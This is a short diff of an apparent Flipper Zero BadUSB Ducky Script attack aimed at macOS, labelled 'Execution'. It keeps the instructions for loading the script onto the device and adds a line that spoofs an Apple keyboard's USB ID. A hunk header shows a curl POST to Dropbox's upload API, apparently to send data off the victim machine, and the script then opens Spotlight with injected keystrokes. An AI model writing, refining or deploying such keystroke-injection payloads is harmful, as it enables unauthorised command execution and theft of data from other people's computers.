@@ -24,7 +24,7 @@ curl -X POST "https://content.dropboxapi.com/2/files/upload" \
 
 
 
-REM Now save the below Ducky Script (lines 37-57) as a .txt file (main Read.me has step by step directions)
+REM Now save the below Ducky Script (lines 37-58) as a .txt file (main Read.me has step by step directions)
 REM and put the .txt file on your flipper zero to execute the Ducky Script through the terminal.
 
 
@@ -34,6 +34,7 @@ REM Target: MacOS
 REM Version: 1.0
 REM Category: Execution
 
+ID 05ac:021e Apple:Keyboard
 DELAY 1000
 GUI SPACE
 DELAY 500
